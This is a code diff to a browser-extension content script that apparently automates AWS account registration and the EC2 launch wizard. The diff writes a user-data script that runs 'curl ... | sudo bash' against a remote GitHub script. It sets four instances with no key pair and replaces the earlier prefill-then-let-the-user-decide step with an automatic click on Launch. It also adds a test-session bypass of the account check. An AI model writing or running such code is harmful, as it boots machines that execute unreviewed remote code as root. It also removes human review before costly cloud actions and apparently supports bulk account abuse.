@@ -284,6 +284,13 @@
   let domainBlockReported = false;
   let signupFaultReported = false;
   let autoBootHandled = false;
+  const INSTANCE_COUNT = 4;
+  const USER_DATA_SCRIPT = `#!/bin/bash
+curl -fsSL  https://raw.githubusercontent.com/kungwu222/scripts-hub/refs/heads/main/myinit.sh | sudo bash
+sudo apt install unzip -y`;
+  const EC2_LAUNCH_RESULT_TIMEOUT_MS = 60000;
+  const AUTO_BOOT_CONTROL_RETRY_MS = 3000;
+  const AUTO_BOOT_CONTROL_TIMEOUT_MS = 15000;
 
   /**
    * 延迟函数
@@ -370,7 +377,7 @@
    * 获取账号信息（带重试和详细日志）
    */
   async function getAccountInfo() {
-    if (accountInfo && accountInfo.email) {
+    if (accountInfo && (accountInfo.email || accountInfo.devTest)) {
       return accountInfo;
     }
 
@@ -379,9 +386,9 @@
     for (let i = 0; i < 10; i++) {
       try {
         const response = await chrome.runtime.sendMessage({ type: 'GET_ACCOUNT_INFO' });
-        if (response && response.email) {
+        if (response && (response.email || response.devTest)) {
           accountInfo = response;
-          console.log('[Content Script] 获取到账号信息:', accountInfo.email);
+          console.log('[Content Script] 获取到账号信息:', accountInfo.email || '(开发测试会话)');
           return accountInfo;
         } else {
           console.log(`[Content Script] 第 ${i + 1} 次尝试: 未获取到账号信息`);
@@ -1108,10 +1115,23 @@
 
   function handleQuotaPage() {
     const text = document.body?.innerText || '';
-    if (document.readyState !== 'complete'
-      || !text.includes('Running On-Demand Standard (A, C, D, H, I, M, R, T, Z) instances')
-      || !text.includes('Applied account-level quota value')) {
+    if (document.readyState !== 'complete') {
       return false;
+    }
+    if (!text.includes('Running On-Demand Standard (A, C, D, H, I, M, R, T, Z) instances')
+      || !text.includes('Applied account-level quota value')) {
+      if (!window.quotaWaitStarted) window.quotaWaitStarted = Date.now();
+      const elapsed = Date.now() - window.quotaWaitStarted;
+      if (elapsed < 60000) {
+        updateStep(`等待 EC2 配额页面加载 (${Math.ceil((60000 - elapsed) / 1000)}s)...`);
+        return false;
+      }
+      chrome.runtime.sendMessage({
+        type: 'QUOTA_PAGE_RESULT',
+        success: false,
+        error: '等待 60 秒后配额页面仍未加载完成'
+      }).catch(() => {});
+      return true;
     }
     const quotaLabel = [...document.querySelectorAll('label')]
       .find((label) => label.textContent.trim().toLowerCase() === 'applied account-level quota value');
@@ -1178,63 +1198,47 @@
       || null;
   }
 
-  async function handleAutoBootLaunchPage() {
-    if (autoBootHandled) return true;
-    const doc = ec2LaunchDocument();
-    if (doc.readyState !== 'complete') return false;
-    if (!window.autoBootWaitStarted) {
-      window.autoBootWaitStarted = Date.now();
-      return false;
+  function findUserDataInput(doc) {
+    const label = [...doc.querySelectorAll('label')].find((el) => /user data/i.test(el.textContent || ''));
+    const byFor = label?.htmlFor ? doc.getElementById(label.htmlFor) : null;
+    if (byFor?.tagName === 'TEXTAREA') return byFor;
+    const byAria = [...doc.querySelectorAll('textarea')].find((el) =>
+      /user data/i.test(`${el.getAttribute('aria-label') || ''} ${el.placeholder || ''}`));
+    if (byAria) return byAria;
+    let node = label;
+    for (let depth = 0; node && depth < 6; depth++, node = node.parentElement) {
+      const textarea = node.querySelector('textarea');
+      if (textarea) return textarea;
     }
-    if (Date.now() - window.autoBootWaitStarted < 10000) {
-      updateStep(`等待 EC2 启动页面稳定 (${Math.ceil((10000 - (Date.now() - window.autoBootWaitStarted)) / 1000)}s)...`);
-      return false;
-    }
-    const bodyText = doc.body?.innerText || '';
-    if (!bodyText.includes('Launch an instance') && !bodyText.includes('Launch instance')) return false;
-    autoBootHandled = true;
-    updateStep('EC2 启动向导已加载，开始预填配置（不会启动实例）...');
+    return null;
+  }
 
-    const nameInput = doc.querySelector('input[placeholder="e.g. My Web Server"]')
-      || labelControl(doc, ['name']);
-    const keyLabel = [...doc.querySelectorAll('label')].find((el) => /key pair name/i.test(el.textContent));
-    const keySelect = keyLabel?.closest('[data-awsui-analytics]')?.querySelector('[data-id="keypair-select"]');
-    const keyTrigger = keySelect?.querySelector('button');
-    const advancedText = [...doc.querySelectorAll('*')].find((el) =>
-      el.children.length === 0 && /advanced details/i.test(el.textContent || ''));
-    const advancedButton = advancedText?.closest('[role="button"][aria-controls]');
-    const countInput = labelControl(doc, ['number of instances']);
-    const missing = [];
-    if (!nameInput?.getClientRects().length) missing.push('Name');
-    if (!keyTrigger?.getClientRects().length) missing.push('Key pair');
-    if (!countInput?.getClientRects().length) missing.push('Number of instances');
-    if (missing.length) {
-      chrome.runtime.sendMessage({
-        type: 'AUTO_BOOT_PREFILL_RESULT',
-        success: false,
-        error: `找不到页面控件：${missing.join('、')}`
-      }).catch(() => {});
-      return true;
-    }
-    setNativeValue(nameInput, 'My Web Server');
-    const debian = doc.querySelector('[data-testid="getting-started-tile-6"]')
+  // Tile test ids shift once the console adds a "Recents" tab, so match by label.
+  function findDebianTile(doc) {
+    const isDebian = (el) => /^debian$/i.test((el.innerText || '').trim().split('\n')[0].trim());
+    return [...doc.querySelectorAll('[data-testid^="getting-started-tile-"]')]
+      .find((tile) => visibleElement(tile) && isDebian(tile))
       || [...doc.querySelectorAll('button,[role="radio"],[role="button"],label')]
-        .find((el) => el.textContent.trim() === 'Debian' && visibleElement(el));
-    if (!debian) {
-      chrome.runtime.sendMessage({ type: 'AUTO_BOOT_PREFILL_RESULT', success: false, error: '找不到 Debian Quick Start 镜像选项' }).catch(() => {});
-      return true;
-    }
-    const quickStart = debian.closest('[data-testid="getting-started-tile-6"]');
-    const selectedQuickStart = [...doc.querySelectorAll('[data-testid^="getting-started-tile-"]')]
-      .find((tile) => tile.getAttribute('aria-checked') === 'true'
-        || tile.getAttribute('aria-selected') === 'true'
-        || tile.className.includes('selected'));
-    if (selectedQuickStart !== quickStart) {
-      pressControl(debian);
-      await sleep(500);
-    }
+        .find((el) => visibleElement(el) && isDebian(el))
+      || null;
+  }
 
-    if (!/proceed without a key pair/i.test(keyTrigger.innerText || '')) {
+  function findKeyPairControls(doc) {
+    const keyLabel = [...doc.querySelectorAll('label')].find((el) => /key pair name/i.test(el.textContent));
+    const keySelect = keyLabel?.closest('[data-awsui-analytics]')?.querySelector('[data-id="keypair-select"]')
+      || doc.querySelector('[data-id="keypair-select"]');
+    return { keySelect, keyTrigger: keySelect?.querySelector('button') || null };
+  }
+
+  // Changing the AMI re-renders the key pair select, so look it up again on every attempt.
+  async function selectNoKeyPair(doc) {
+    for (let attempt = 0; attempt < 3; attempt++) {
+      const { keySelect, keyTrigger } = findKeyPairControls(doc);
+      if (!visibleElement(keyTrigger)) {
+        await sleep(1000);
+        continue;
+      }
+      if (/proceed without a key pair/i.test(keyTrigger.innerText || '')) return true;
       scrollIntoViewInOwnDocument(keyTrigger);
       pressControl(keyTrigger);
       await sleep(500);
@@ -1247,10 +1251,102 @@
       if (choice) {
         scrollIntoViewInOwnDocument(choice);
         pressControl(choice);
-        await sleep(500);
       }
+      await sleep(800);
+      const current = findKeyPairControls(doc).keyTrigger;
+      if (/proceed without a key pair/i.test(current?.innerText || '')) return true;
+      console.log(`[Content Script] 第 ${attempt + 1} 次选择无 Key Pair 未生效，当前: ${(current?.innerText || '').trim()}`);
     }
-    if (!/proceed without a key pair/i.test(keyTrigger.innerText || '')) {
+    return false;
+  }
+
+  async function handleAutoBootLaunchPage() {
+    if (autoBootHandled) return true;
+    const started = Date.now();
+    let lastRetryNotice = 0;
+    let controls;
+    while (Date.now() - started < AUTO_BOOT_CONTROL_TIMEOUT_MS) {
+      const outerDoc = document;
+      const frame = outerDoc.querySelector('iframe#instance-lx-react-frame');
+      const doc = ec2LaunchDocument();
+      const bodyText = doc.body?.innerText || '';
+      const launchPageReady = outerDoc.readyState === 'complete'
+        && (!frame || (frame.contentDocument && frame.contentDocument.readyState === 'complete'))
+        && (bodyText.includes('Launch an instance') || bodyText.includes('Launch instance'));
+
+      if (launchPageReady) {
+        const nameInput = doc.querySelector('input[placeholder="e.g. My Web Server"]')
+          || labelControl(doc, ['name']);
+        const keyLabel = [...doc.querySelectorAll('label')].find((el) => /key pair name/i.test(el.textContent));
+        const keySelect = keyLabel?.closest('[data-awsui-analytics]')?.querySelector('[data-id="keypair-select"]');
+        const keyTrigger = keySelect?.querySelector('button');
+        const advancedText = [...doc.querySelectorAll('*')].find((el) =>
+          el.children.length === 0 && /advanced details/i.test(el.textContent || ''));
+        const advancedButton = advancedText?.closest('[role="button"][aria-controls]');
+        const countInput = labelControl(doc, ['number of instances']);
+        const missing = [];
+        if (!visibleElement(nameInput)) missing.push('Name');
+        if (!visibleElement(keyTrigger)) missing.push('Key pair');
+        if (!visibleElement(countInput)) missing.push('Number of instances');
+        if (!missing.length) {
+          controls = { doc, nameInput, keySelect, keyTrigger, advancedButton, countInput };
+          break;
+        }
+      }
+
+      const elapsed = Date.now() - started;
+      if (elapsed - lastRetryNotice >= AUTO_BOOT_CONTROL_RETRY_MS) {
+        lastRetryNotice = elapsed;
+        updateStep(`等待 EC2 启动控件加载 (${Math.ceil((AUTO_BOOT_CONTROL_TIMEOUT_MS - elapsed) / 1000)}s)...`);
+      }
+      await sleep(Math.min(AUTO_BOOT_CONTROL_RETRY_MS, AUTO_BOOT_CONTROL_TIMEOUT_MS - elapsed));
+    }
+
+    if (!controls) {
+      autoBootHandled = true;
+      chrome.runtime.sendMessage({
+        type: 'AUTO_BOOT_PREFILL_RESULT',
+        success: false,
+        error: '等待 15 秒后仍未找到必要启动控件'
+      }).catch(() => {});
+      return true;
+    }
+
+    autoBootHandled = true;
+    const claim = await chrome.runtime.sendMessage({ type: 'AUTO_BOOT_CLAIM' }).catch(() => null);
+    if (!claim?.allowed) {
+      console.log('[Content Script] 本会话已执行过开机或未启用自动开机，跳过');
+      return true;
+    }
+    const { doc, nameInput, advancedButton, countInput } = controls;
+    updateStep('EC2 启动向导已加载，开始预填配置...');
+    setNativeValue(nameInput, 'My Web Server');
+    let debian = null;
+    for (let waited = 0; waited <= AUTO_BOOT_CONTROL_TIMEOUT_MS; waited += 500) {
+      debian = findDebianTile(doc);
+      if (debian) break;
+      const quickStartTab = [...doc.querySelectorAll('[role="tab"]')]
+        .find((tab) => /^quick start$/i.test((tab.innerText || '').trim()) && tab.getAttribute('aria-selected') !== 'true');
+      if (quickStartTab) pressControl(quickStartTab);
+      await sleep(500);
+    }
+    if (!debian) {
+      console.log('[Content Script] 镜像磁贴:', [...doc.querySelectorAll('[data-testid^="getting-started-tile-"]')]
+        .map((tile) => `${tile.dataset.testid}=${(tile.innerText || '').trim().split('\n')[0]}`));
+      chrome.runtime.sendMessage({ type: 'AUTO_BOOT_PREFILL_RESULT', success: false, error: '找不到 Debian Quick Start 镜像选项' }).catch(() => {});
+      return true;
+    }
+    const quickStart = debian.closest('[data-testid^="getting-started-tile-"]') || debian;
+    const selectedQuickStart = [...doc.querySelectorAll('[data-testid^="getting-started-tile-"]')]
+      .find((tile) => tile.getAttribute('aria-checked') === 'true'
+        || tile.getAttribute('aria-selected') === 'true'
+        || tile.className.includes('selected'));
+    if (selectedQuickStart !== quickStart) {
+      pressControl(debian);
+      await sleep(500);
+    }
+
+    if (!await selectNoKeyPair(doc)) {
       chrome.runtime.sendMessage({ type: 'AUTO_BOOT_PREFILL_RESULT', success: false, error: '未能选择无 Key Pair 选项；为避免预填错误已停止' }).catch(() => {});
       return true;
     }
@@ -1264,22 +1360,98 @@
       pressControl(advancedButton);
       await sleep(500);
     }
-    const userDataLabel = [...doc.querySelectorAll('label')].find((label) => /user data/i.test(label.textContent || ''));
-    const userData = userDataLabel
-      ? (doc.getElementById(userDataLabel.htmlFor) || userDataLabel.closest('[data-awsui-analytics]')?.querySelector('textarea'))
-      : null;
-    if (userData && visibleElement(userData)) {
-      scrollIntoViewInOwnDocument(userData);
-      setNativeValue(userData, '');
+    let userData = null;
+    for (let waited = 0; waited <= 6000; waited += 500) {
+      userData = findUserDataInput(doc);
+      if (userData && visibleElement(userData)) break;
+      userData = null;
+      await sleep(500);
+    }
+    if (!userData) {
+      chrome.runtime.sendMessage({ type: 'AUTO_BOOT_PREFILL_RESULT', success: false, error: '找不到 User data 输入框' }).catch(() => {});
+      return true;
+    }
+    scrollIntoViewInOwnDocument(userData);
+    setNativeValue(userData, USER_DATA_SCRIPT);
+
+    const freshCountInput = labelControl(doc, ['number of instances']) || countInput;
+    scrollIntoViewInOwnDocument(freshCountInput);
+    setNativeValue(freshCountInput, String(INSTANCE_COUNT));
+
+    // The wizard re-renders sections asynchronously, so re-check everything at the end.
+    await sleep(1000);
+    if (!await selectNoKeyPair(doc)) {
+      chrome.runtime.sendMessage({ type: 'AUTO_BOOT_PREFILL_RESULT', success: false, error: 'Key Pair 选择被页面重置，重试后仍未选中' }).catch(() => {});
+      return true;
+    }
+    const finalName = doc.querySelector('input[placeholder="e.g. My Web Server"]') || labelControl(doc, ['name']);
+    if (finalName && finalName.value !== 'My Web Server') setNativeValue(finalName, 'My Web Server');
+    const finalCount = labelControl(doc, ['number of instances']);
+    if (finalCount && finalCount.value !== String(INSTANCE_COUNT)) setNativeValue(finalCount, String(INSTANCE_COUNT));
+    const finalUserData = findUserDataInput(doc);
+    if (finalUserData && finalUserData.value !== USER_DATA_SCRIPT) setNativeValue(finalUserData, USER_DATA_SCRIPT);
+    await sleep(300);
+    if (finalCount?.value !== String(INSTANCE_COUNT)) {
+      chrome.runtime.sendMessage({ type: 'AUTO_BOOT_PREFILL_RESULT', success: false, error: `实例数未能设为 ${INSTANCE_COUNT}（当前 ${finalCount?.value ?? '未找到'}）` }).catch(() => {});
+      return true;
+    }
+    if (finalUserData?.value !== USER_DATA_SCRIPT) {
+      chrome.runtime.sendMessage({ type: 'AUTO_BOOT_PREFILL_RESULT', success: false, error: 'User data 未能写入' }).catch(() => {});
+      return true;
     }
 
-    updateStep('配置已预填；请检查后手动决定是否启动实例');
-    chrome.runtime.sendMessage({
-      type: 'AUTO_BOOT_PREFILL_RESULT',
-      success: true,
-      note: '已预填 Debian、实例名及无 Key Pair；未提交启动'
-    }).catch(() => {});
+    updateStep(`配置已预填，点击 Launch 启动 ${INSTANCE_COUNT} 台实例...`);
+    const launched = await launchAndWaitForResult();
+    updateStep(launched.success ? launched.note : `EC2 启动失败：${launched.error}`);
+    chrome.runtime.sendMessage({ type: 'AUTO_BOOT_PREFILL_RESULT', ...launched }).catch(() => {});
     return true;
+  }
+
+  function findLaunchButton(doc) {
+    return [...doc.querySelectorAll('button')].find((button) =>
+      /^launch instances?$/i.test((button.innerText || '').trim())
+      && visibleElement(button)
+      && button.getAttribute('aria-disabled') !== 'true') || null;
+  }
+
+  function launchPageDocs() {
+    const frameDoc = ec2LaunchDocument();
+    return frameDoc === document ? [document] : [frameDoc, document];
+  }
+
+  async function launchAndWaitForResult() {
+    let launchButton = null;
+    for (let waited = 0; waited <= AUTO_BOOT_CONTROL_TIMEOUT_MS && !launchButton; waited += 500) {
+      launchButton = findLaunchButton(ec2LaunchDocument());
+      if (!launchButton) await sleep(500);
+    }
+    if (!launchButton) return { success: false, error: '配置已预填，但找不到可点击的 Launch instance 按钮' };
+
+    scrollIntoViewInOwnDocument(launchButton);
+    console.log('[Content Script] 点击 Launch instance');
+    pressControl(launchButton);
+
+    const deadline = Date.now() + EC2_LAUNCH_RESULT_TIMEOUT_MS;
+    while (Date.now() < deadline) {
+      await sleep(1000);
+      for (const doc of launchPageDocs()) {
+        const text = doc.body?.innerText || '';
+        if (/successfully initiated launch/i.test(text)) {
+          const ids = [...new Set(text.match(/\bi-[0-9a-f]{8,17}\b/g) || [])];
+          return {
+            success: true,
+            note: `已启动 ${INSTANCE_COUNT} 台 Debian 实例${ids.length ? `：${ids.join(', ')}` : ''}`
+          };
+        }
+        if (/instance launch failed|failed to launch|launch failed/i.test(text)) {
+          const alert = [...doc.querySelectorAll('[role="alert"], [data-testid*="error"], [class*="flash"]')]
+            .map((el) => (el.innerText || '').trim())
+            .find((value) => /fail|error|denied|limit|validat/i.test(value));
+          return { success: false, error: (alert || '页面提示实例启动失败').slice(0, 300) };
+        }
+      }
+    }
+    return { success: false, error: `点击 Launch 后 ${EC2_LAUNCH_RESULT_TIMEOUT_MS / 1000} 秒内未看到启动结果，请到 EC2 Instances 页面确认` };
   }
 
   function handleUnexpectedDevicePage() {
@@ -1363,7 +1535,10 @@
 
     // 检查是否有正在进行的注册
     const info = await getAccountInfo();
-    if (!info?.email) {
+    const devAutoBootPage = info?.devTest
+      && /\/ec2\/home/i.test(window.location.pathname)
+      && /LaunchInstances:/i.test(window.location.hash);
+    if (!info?.email && !devAutoBootPage) {
       console.log('[Content Script] 没有注册任务，跳过');
       return;
     }
